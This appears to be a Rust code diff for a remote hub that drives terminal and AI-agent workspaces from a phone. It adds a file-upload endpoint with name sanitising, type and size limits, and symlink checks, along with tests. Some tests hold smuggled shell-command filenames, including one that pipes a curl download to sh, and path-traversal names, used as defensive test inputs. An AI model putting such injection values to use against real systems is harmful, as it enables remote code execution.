@@ -54,6 +54,8 @@ const LINGER: Duration = Duration::from_secs(3);
 const MAX_ATTACHING: usize = 4;
 /// Images being saved now (see [`MAX_ATTACHING`]).
 static ATTACHING: AtomicUsize = AtomicUsize::new(0);
+/// Image and file bodies being received now: taken from the head, before the body is read.
+static RECEIVING: AtomicUsize = AtomicUsize::new(0);
 /// How long an attached image is kept: long enough for the agent to read it, then cleared away.
 const ATTACHMENT_LIFETIME: Duration = Duration::from_secs(7 * 24 * 60 * 60);
 /// Refused uploads drained at once; past this the connection just closes, so refusals can't
@@ -130,8 +132,9 @@ pub enum Command {
     Wake { workspace: u64 },
     /// A new tab in a workspace, with a shell or an agent, where the workspace is.
     NewTab { workspace: u64, kind: PaneKind },
-    /// A new workspace in a folder under the remote folder (checked), with a shell or an agent.
-    OpenFolder { folder: std::path::PathBuf, kind: PaneKind },
+    /// A new workspace in a folder under the remote folder (checked), with a shell or an agent,
+    /// listed under `group` (made if there is none) when one is given, and named `title` when one is given.
+    OpenFolder { folder: std::path::PathBuf, kind: PaneKind, group: Option<String>, title: Option<String> },
     /// A local dev server a terminal runs (`port`, checked against the overview) shown on the
     /// tailnet through Agentty's proxy (`devproxy`).
     OpenPort { port: u16 },
@@ -255,7 +258,26 @@ struct WorkspaceBody {
     /// For `mkdir`: the new folder's name.
     #[serde(default)]
     name: String,
+    /// For `open`: the group the new workspace is listed under.
+    #[serde(default)]
+    group: Option<String>,
+    /// For `open`: the name the new workspace is shown with, instead of the tool's.
+    #[serde(default)]
+    title: Option<String>,
 }
+
+const MAX_GROUP_NAME: usize = 40;
+const MAX_TITLE_NAME: usize = 60;
+
+/// Files the page may send into a workspace's folder, by extension (lowercase).
+const WORKSPACE_FILE_TYPES: &[&str] = &[
+    "pdf", "png", "jpg", "jpeg", "gif", "webp", "heic", "txt", "md", "csv", "json", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "rtf",
+    "zip",
+];
+/// Where those files go, inside the workspace's folder.
+const WORKSPACE_FILE_DIR: &str = ".agentty-remote";
+/// In characters: 70 Hangul syllables are 210 bytes, under the 255-byte name limit with the extension.
+const MAX_WORKSPACE_FILE_NAME: usize = 70;
 
 /// Tabs the page may open in a minute: a few by hand, never a loop starting hundreds of shells.
 const MAX_NEW_TABS: usize = 10;
@@ -418,6 +440,16 @@ impl Hub {
     /// the session cookie must be one of that login's. The page's cookie reaches the dev server's
     /// address as well: cookies are kept per machine name, not per port.
     pub fn admits(&self, login: Option<&str>, cookie_header: Option<&str>) -> bool {
+        self.dev_admits(login, cookie_header, false)
+    }
+
+    /// `admits` for a connection already open, checked again every few seconds: it doesn't count
+    /// as use, so a live-reload socket left open can't keep the session from going idle.
+    pub fn still_admits(&self, login: Option<&str>, cookie_header: Option<&str>) -> bool {
+        self.dev_admits(login, cookie_header, true)
+    }
+
+    fn dev_admits(&self, login: Option<&str>, cookie_header: Option<&str>, recheck: bool) -> bool {
         let config = self.config();
         if self.paused.load(Ordering::SeqCst) || self.stop.load(Ordering::SeqCst) {
             return false;
@@ -435,7 +467,12 @@ impl Hub {
             .find(|(k, _)| *k == name)
             .map(|(_, v)| v)
             .unwrap_or("");
-        self.auth.lock().unwrap_or_else(|e| e.into_inner()).sessions.check(token, &login, SystemTime::now())
+        let mut auth = self.auth.lock().unwrap_or_else(|e| e.into_inner());
+        if recheck {
+            auth.sessions.check_idle(token, &login, SystemTime::now())
+        } else {
+            auth.sessions.check(token, &login, SystemTime::now())
+        }
     }
 
     /// Whether a terminal the page may see runs a server on `port` now (the overview's ports).
@@ -580,6 +617,9 @@ impl Hub {
         let config = self.config.read().unwrap_or_else(|e| e.into_inner()).clone();
         let deadline = Instant::now() + REQUEST_DEADLINE;
         let upload = std::cell::Cell::new(false);
+        // Held from the head until the connection ends, so at most `MAX_ATTACHING` image or file
+        // bodies (up to `FILE_MAX_BODY` each) are in memory at once, not one per connection.
+        let receiving = std::cell::RefCell::new(None);
         let request = match http::read_request(&mut stream, deadline, |head| {
             upload.set(http::is_upload(&head.path));
             if config.secret.as_deref().is_some_and(|secret| strip_secret(&head.path, secret).is_none()) {
@@ -588,6 +628,9 @@ impl Hub {
             let (host, login) = self.admitted(head, &config, true).map_err(|refused| refused.status)?;
             if http::is_upload(&head.path) {
                 self.upload_admitted(head, &config, &host, &login)?;
+                if !http::is_voice(&head.path) {
+                    *receiving.borrow_mut() = Some(Slot::take(&RECEIVING, MAX_ATTACHING).ok_or(429u16)?);
+                }
             }
             Ok(())
         }) {
@@ -806,6 +849,7 @@ impl Hub {
             ("POST", "/api/input") => Routed::Response(self.input(request)),
             ("POST", "/api/voice") => Routed::Response(self.voice(request)),
             ("POST", "/api/attach") => Routed::Response(self.attach(request)),
+            ("POST", "/api/workspace/file") => Routed::Response(self.workspace_file(request)),
             ("POST", "/api/workspace") => Routed::Response(self.workspace_action(request)),
             ("POST", "/api/devserver") => Routed::Response(self.open_dev_server(request)),
             _ => Routed::Response(Response::json(404, &json!({ "error": "not found" }))),
@@ -973,7 +1017,10 @@ impl Hub {
             "resize" if COLS.contains(&body.cols) && ROWS.contains(&body.rows) => {
                 Command::Resize { pane: body.pane, cols: body.cols, rows: body.rows }
             }
-            "scroll" if body.lines != 0 && body.lines.abs() <= SCROLL_LINES => Command::Scroll { pane: body.pane, lines: body.lines },
+            // `unsigned_abs`: `i32::MIN.abs()` would wrap to a negative number and pass this check.
+            "scroll" if body.lines != 0 && body.lines.unsigned_abs() <= SCROLL_LINES as u32 => {
+                Command::Scroll { pane: body.pane, lines: body.lines }
+            }
             _ => return Response::json(400, &json!({ "error": "bad request" })),
         };
         // Held while queueing: a size is only taken while a page shows that terminal, and the
@@ -1117,6 +1164,20 @@ impl Hub {
             let config = self.config.read().unwrap_or_else(|e| e.into_inner()).clone();
             let Some(root) = &config.folders else { return Response::json(404, &json!({ "error": "not found" })) };
             let kind = kind(&body.tool);
+            let plain = |group: &str| {
+                (1..=MAX_GROUP_NAME).contains(&group.chars().count()) && group.trim() == group && !group.chars().any(char::is_control)
+            };
+            if body.group.as_deref().is_some_and(|group| !plain(group) || body.action != "open") {
+                return Response::json(400, &json!({ "error": "bad request" }));
+            }
+            let title_ok = |title: &str| {
+                (1..=MAX_TITLE_NAME).contains(&title.chars().count()) && title.trim() == title && !title.chars().any(char::is_control)
+            };
+            if body.title.as_deref().is_some_and(|title| !title_ok(title) || body.action != "open") {
+                return Response::json(400, &json!({ "error": "bad request" }));
+            }
+            let group = body.group.clone();
+            let title = body.title.clone();
             if body.action == "open" && kind.is_none() || body.action == "mkdir" && !body.tool.is_empty() {
                 return Response::json(400, &json!({ "error": "bad request" }));
             }
@@ -1146,7 +1207,7 @@ impl Hub {
                 Err(_) => return Response::json(500, &json!({ "error": "couldn't make the folder" })),
             };
             return match kind {
-                Some(kind) => self.queue(Command::OpenFolder { folder, kind }),
+                Some(kind) => self.queue(Command::OpenFolder { folder, kind, group, title }),
                 None => Response::json(200, &json!({ "ok": true })),
             };
         }
@@ -1166,6 +1227,45 @@ impl Hub {
             _ => return Response::json(400, &json!({ "error": "bad request" })),
         };
         self.queue(command)
+    }
+
+    /// Saves a file sent from the phone (raw bytes in the body) into a workspace's folder, under
+    /// `.agentty-remote/`, and returns its path relative to that folder, which the page pastes
+    /// into a prompt. Only the kinds of `WORKSPACE_FILE_TYPES`, by the name's extension, under the
+    /// file name alone (a name with a separator or `..` is refused); never over a file already there.
+    fn workspace_file(&self, request: &Request) -> Response {
+        let bad = || Response::json(400, &json!({ "error": "bad request" }));
+        let (Some(id), Some(name)) = (request.query_param("workspace").and_then(|t| t.parse::<u64>().ok()), request.query_param("name"))
+        else {
+            return bad();
+        };
+        let folder = {
+            let view = self.view.lock().unwrap_or_else(|e| e.into_inner());
+            let Some(workspace) = view.workspaces.iter().find(|w| w.id == id) else {
+                return Response::json(404, &json!({ "error": "no such workspace" }));
+            };
+            // The folder it was opened on, not wherever its terminal has `cd`'d to since.
+            workspace.root.clone()
+        };
+        let Some(name) = workspace_file_name(&name) else { return bad() };
+        let extension = name.rsplit_once('.').map(|(_, ext)| ext.to_ascii_lowercase());
+        if !extension.is_some_and(|ext| WORKSPACE_FILE_TYPES.contains(&ext.as_str())) {
+            return Response::json(415, &json!({ "error": "unsupported type" }));
+        }
+        if request.body.is_empty() {
+            return bad();
+        }
+        if request.body.len() > http::FILE_MAX_BODY {
+            return Response::json(413, &json!({ "error": "too large" }));
+        }
+        let Some(_slot) = Slot::take(&ATTACHING, MAX_ATTACHING) else {
+            return Response::json(429, &json!({ "error": "busy" }));
+        };
+        match save_workspace_file(&folder, &name, &request.body) {
+            Ok(path) => Response::json(200, &json!({ "path": path })),
+            Err(err) if err.kind() == std::io::ErrorKind::NotFound => Response::json(404, &json!({ "error": "no such workspace" })),
+            Err(_) => Response::json(500, &json!({ "error": "not saved" })),
+        }
     }
 
     /// `{"port": 3000}`: a dev server a terminal runs, to be shown on the tailnet. Only a port the
@@ -1271,7 +1371,7 @@ impl Hub {
             {
                 break;
             }
-            if !self.auth.lock().unwrap_or_else(|e| e.into_inner()).sessions.check(token, login, SystemTime::now()) {
+            if !self.auth.lock().unwrap_or_else(|e| e.into_inner()).sessions.check_idle(token, login, SystemTime::now()) {
                 let _ = event(stream, "signedout", "{}");
                 break;
             }
@@ -1339,6 +1439,77 @@ pub(super) fn strip_secret(path: &str, secret: &str) -> Option<String> {
         _ if tail.starts_with('/') => Some(tail.to_string()),
         _ => None,
     }
+}
+
+/// `name` as a file name to save under: a plain name only (no separators, no `..`), with what a
+/// file system would trip on made `_`, and no hidden name. `None` when it is not one.
+fn workspace_file_name(name: &str) -> Option<String> {
+    if name.is_empty() || name.contains(['/', '\\', '\0']) || name.contains("..") {
+        return None;
+    }
+    // The returned path is pasted into a terminal prompt, so only letters, digits, spaces and `._-`
+    // stay: `$(…)`, backticks, `;`, quotes and the like would be shell syntax there.
+    let clean: String = name.chars().map(|c| if c.is_alphanumeric() || matches!(c, ' ' | '.' | '_' | '-') { c } else { '_' }).collect();
+    let clean = clean.trim();
+    if clean.starts_with('.') || clean.starts_with('-') {
+        return None;
+    }
+    let Some((stem, extension)) = clean.rsplit_once('.') else {
+        let stem: String = clean.chars().take(MAX_WORKSPACE_FILE_NAME).collect();
+        return (!stem.is_empty()).then_some(stem);
+    };
+    let stem: String = stem.trim().chars().take(MAX_WORKSPACE_FILE_NAME).collect();
+    let extension: String = extension.chars().take(16).collect();
+    (!stem.is_empty() && !extension.is_empty()).then(|| format!("{stem}.{extension}"))
+}
+
+/// Writes `bytes` as `name` (or `name-2`, … when taken) in `.agentty-remote/` of the workspace's
+/// folder and returns the path from that folder.
+fn save_workspace_file(folder: &std::path::Path, name: &str, bytes: &[u8]) -> std::io::Result<String> {
+    use std::io::Write;
+    if !folder.is_absolute() {
+        return Err(std::io::ErrorKind::NotFound.into());
+    }
+    let folder = folder.canonicalize()?;
+    if !folder.is_dir() {
+        return Err(std::io::ErrorKind::NotFound.into());
+    }
+    let dir = folder.join(WORKSPACE_FILE_DIR);
+    // A link named `.agentty-remote` (say, in a cloned repository) must not send the upload elsewhere.
+    if std::fs::symlink_metadata(&dir).is_ok_and(|meta| meta.file_type().is_symlink()) {
+        return Err(std::io::Error::new(std::io::ErrorKind::PermissionDenied, "a link where the upload folder goes"));
+    }
+    std::fs::create_dir_all(&dir)?;
+    if !dir.canonicalize()?.starts_with(&folder) {
+        return Err(std::io::Error::new(std::io::ErrorKind::PermissionDenied, "the upload folder is outside the workspace"));
+    }
+    // Uploads are the person's own documents: keep them out of commits (`git add -A` in the project).
+    let ignore = dir.join(".gitignore");
+    if std::fs::symlink_metadata(&ignore).is_err() {
+        let _ = std::fs::write(&ignore, "*\n");
+    }
+    let (stem, extension) = name.rsplit_once('.').unwrap_or((name, ""));
+    for n in 1..=1000 {
+        let file = if n == 1 { name.to_string() } else { format!("{stem}-{n}.{extension}") };
+        let mut options = std::fs::OpenOptions::new();
+        options.write(true).create_new(true);
+        #[cfg(unix)]
+        std::os::unix::fs::OpenOptionsExt::mode(&mut options, 0o600);
+        match options.open(dir.join(&file)) {
+            Ok(mut out) => {
+                // A half-written file is removed, so a failed upload leaves nothing behind.
+                if let Err(err) = out.write_all(bytes) {
+                    drop(out);
+                    let _ = std::fs::remove_file(dir.join(&file));
+                    return Err(err);
+                }
+                return Ok(format!("{WORKSPACE_FILE_DIR}/{file}"));
+            }
+            Err(err) if err.kind() == std::io::ErrorKind::AlreadyExists => {}
+            Err(err) => return Err(err),
+        }
+    }
+    Err(std::io::ErrorKind::AlreadyExists.into())
 }
 
 /// Where images attached on the page are kept, in Agentty's own (private) data folder.
@@ -1554,6 +1725,8 @@ fn device_name(agent: &str) -> String {
     } else {
         "?"
     };
+    // The Agentty app names itself in its user agent, so its devices show as the app, not a browser.
+    let browser = if agent.contains("AgenttyRemote/") { "Agentty Remote" } else { browser };
     format!("{browser} · {system}")
 }
 
@@ -1916,6 +2089,7 @@ mod tests {
             color: None,
             branch: None,
             folder: "~/repo".into(),
+            root: std::path::PathBuf::new(),
             sleeping: true,
             active_tab: 0,
             tabs: Vec::new(),
@@ -1983,7 +2157,15 @@ mod tests {
         assert_eq!(act(json!({ "action": "mkdir", "path": "app", "name": "web" })), 200);
         assert_eq!(act(json!({ "action": "mkdir", "path": "", "name": "x", "tool": "shell" })), 400, "making a folder opens nothing");
         assert_eq!(act(json!({ "action": "open", "path": "app", "tool": "claude" })), 200);
-        assert_eq!(act(json!({ "action": "open", "path": "app/web", "tool": "codex" })), 200);
+        assert_eq!(act(json!({ "action": "open", "path": "app/web", "tool": "codex", "group": "Phone", "title": "phone-test" })), 200);
+        for title in [json!(""), json!("t".repeat(MAX_TITLE_NAME + 1)), json!("a\nb"), json!(" a"), json!(3)] {
+            assert_eq!(act(json!({ "action": "open", "path": "app", "tool": "shell", "title": title })), 400, "{title}");
+        }
+        assert_eq!(act(json!({ "action": "mkdir", "path": "", "name": "z", "title": "x" })), 400, "a title is for opening");
+        for group in [json!(""), json!("g".repeat(MAX_GROUP_NAME + 1)), json!("a\nb"), json!(" a"), json!(3)] {
+            assert_eq!(act(json!({ "action": "open", "path": "app", "tool": "shell", "group": group })), 400, "{group}");
+        }
+        assert_eq!(act(json!({ "action": "mkdir", "path": "", "name": "y", "group": "Phone" })), 400, "a group is for opening");
         assert!(get("/api/folders").2.contains("\"folders\":[\"app\"]"));
         assert!(get("/api/folders?path=app").2.contains("\"folders\":[\"web\"]"));
         for path in ["..", "../..", "/etc", "app/..", ".ssh", "missing"] {
@@ -1997,12 +2179,82 @@ mod tests {
         assert_eq!(
             hub.take_commands(),
             vec![
-                Command::OpenFolder { folder: made.clone(), kind: PaneKind::Claude },
-                Command::OpenFolder { folder: made.join("web"), kind: PaneKind::Codex }
+                Command::OpenFolder { folder: made.clone(), kind: PaneKind::Claude, group: None, title: None },
+                Command::OpenFolder {
+                    folder: made.join("web"),
+                    kind: PaneKind::Codex,
+                    group: Some("Phone".into()),
+                    title: Some("phone-test".into()),
+                }
             ]
         );
         let anonymous = send(&hub, &Req::get("/api/folders").raw()).0;
         assert_eq!(anonymous, 401, "needs a session");
+        hub.shutdown();
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    /// A file sent into a workspace's folder: only for a shown workspace, a known type, a plain name
+    /// and a size within the limit.
+    #[test]
+    fn saves_files_in_the_workspace_folder() {
+        let hub = hub("secret-password");
+        let base = std::env::temp_dir().join(format!("agentty-remote-file-{}-{}", std::process::id(), crate::ui::now_ms()));
+        std::fs::create_dir_all(&base).unwrap();
+        let mut shown = workspace(3);
+        shown.root = base.clone();
+        // Its terminal has moved elsewhere: the file still goes to the workspace's own folder.
+        shown.folder = std::env::temp_dir().display().to_string();
+        hub.publish(vec![shown], Vec::new(), Vec::new());
+        let cookie = sign_in(&hub, "secret-password");
+        let upload = |path: &str, body: &str| {
+            let req = Req { cookie: Some(cookie.clone()), body: body.to_string(), ..Req::post(path, json!({})) };
+            send(&hub, &req.raw())
+        };
+        let (status, _, body) = upload("/api/workspace/file?workspace=3&name=notes.txt", "hello");
+        assert_eq!((status, body.as_str()), (200, "{\"path\":\".agentty-remote/notes.txt\"}"));
+        assert_eq!(std::fs::read_to_string(base.join(".agentty-remote/notes.txt")).unwrap(), "hello");
+        let (_, _, again) = upload("/api/workspace/file?workspace=3&name=notes.txt", "second");
+        assert_eq!(again, "{\"path\":\".agentty-remote/notes-2.txt\"}", "never over a file already there");
+        assert_eq!(std::fs::read_to_string(base.join(".agentty-remote/notes.txt")).unwrap(), "hello");
+        let (status, _, body) = upload("/api/workspace/file?workspace=3&name=Trip%20Photo.PNG", "x");
+        assert_eq!((status, body.as_str()), (200, "{\"path\":\".agentty-remote/Trip Photo.PNG\"}"), "the extension is matched in any case");
+
+        for name in ["", "../notes.txt", "..%2Fnotes.txt", "a/b.txt", "a%5Cb.txt", "notes..txt", ".txt", "%00.txt"] {
+            assert_eq!(upload(&format!("/api/workspace/file?workspace=3&name={name}"), "x").0, 400, "{name:?}");
+        }
+        assert_eq!(upload("/api/workspace/file?workspace=3", "x").0, 400, "no name");
+        assert_eq!(upload("/api/workspace/file?name=notes.txt", "x").0, 400, "no workspace");
+        assert_eq!(upload("/api/workspace/file?workspace=3&name=notes.txt", "").0, 400, "no bytes");
+        assert_eq!(upload("/api/workspace/file?workspace=4&name=notes.txt", "x").0, 404, "a workspace the page is not shown");
+        for name in ["run.sh", "app.exe", "notes", "notes.txt.sh", "page.html"] {
+            assert_eq!(upload(&format!("/api/workspace/file?workspace=3&name={name}"), "x").0, 415, "{name}");
+        }
+        for name in
+            ["a.pdf", "a.jpg", "a.jpeg", "a.gif", "a.webp", "a.heic", "a.md", "a.csv", "a.json", "a.doc", "a.docx", "a.xls", "a.xlsx"]
+        {
+            assert_eq!(upload(&format!("/api/workspace/file?workspace=3&name={name}"), "x").0, 200, "{name}");
+        }
+        for name in ["a.ppt", "a.pptx", "a.rtf", "a.zip"] {
+            assert_eq!(upload(&format!("/api/workspace/file?workspace=3&name={name}"), "x").0, 200, "{name}");
+        }
+        // Too large is told from the head, before the body is read.
+        let head = |len: usize| {
+            let req = Req { cookie: Some(cookie.clone()), ..Req::post("/api/workspace/file?workspace=3&name=big.zip", json!({})) };
+            req.raw().replace("Content-Length: 2\r\n\r\n{}", &format!("Content-Length: {len}\r\n\r\n"))
+        };
+        assert_eq!(send(&hub, &head(http::FILE_MAX_BODY + 1)).0, 413);
+        let head_only = |req: Req| req.raw().replace("Content-Length: 2\r\n\r\n{}", "Content-Length: 4000000\r\n\r\n");
+        let file = || Req::post("/api/workspace/file?workspace=3&name=a.pdf", json!({}));
+        assert_eq!(send(&hub, &head_only(file())).0, 401, "no session");
+        assert_eq!(send(&hub, &head_only(Req { cookie: Some(cookie.clone()), marker: false, ..file() })).0, 403, "not from the page");
+        let slots: Vec<_> = (0..MAX_ATTACHING).map(|_| Slot::take(&ATTACHING, MAX_ATTACHING).unwrap()).collect();
+        assert_eq!(send(&hub, &head_only(Req { cookie: Some(cookie.clone()), ..file() })).0, 429, "as many as image attachments");
+        drop(slots);
+        // Bodies still arriving count too, from the head on: they are refused before being read.
+        let receiving: Vec<_> = (0..MAX_ATTACHING).map(|_| Slot::take(&RECEIVING, MAX_ATTACHING).unwrap()).collect();
+        assert_eq!(send(&hub, &head_only(Req { cookie: Some(cookie.clone()), ..file() })).0, 429, "as many bodies at once");
+        drop(receiving);
         hub.shutdown();
         let _ = std::fs::remove_dir_all(base);
     }
@@ -2279,5 +2531,18 @@ mod tests {
         );
         assert_eq!(device_name("Mozilla/5.0 (Linux; Android 14) Chrome/130.0 Mobile Safari/537.36"), "Chrome · Android");
         assert_eq!(device_name(""), "Browser · ?");
+        assert_eq!(device_name("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AgenttyRemote/1.0"), "Agentty Remote · iPhone");
+    }
+
+    #[test]
+    fn upload_names_carry_no_shell_syntax() {
+        assert_eq!(workspace_file_name("$(curl x.sh|sh).pdf").as_deref(), Some("__curl x.sh_sh_.pdf"));
+        assert_eq!(workspace_file_name("a`id`;b&c'd\".txt").as_deref(), Some("a_id__b_c_d_.txt"));
+        assert_eq!(workspace_file_name("기획 메모-1.md").as_deref(), Some("기획 메모-1.md"));
+        assert_eq!(workspace_file_name("-rf.txt"), None);
+        assert_eq!(workspace_file_name(".env"), None);
+        assert_eq!(workspace_file_name("../x.txt"), None);
+        let long = format!("{}.pdf", "가".repeat(200));
+        assert!(workspace_file_name(&long).is_some_and(|n| n.len() <= 255));
     }
 }
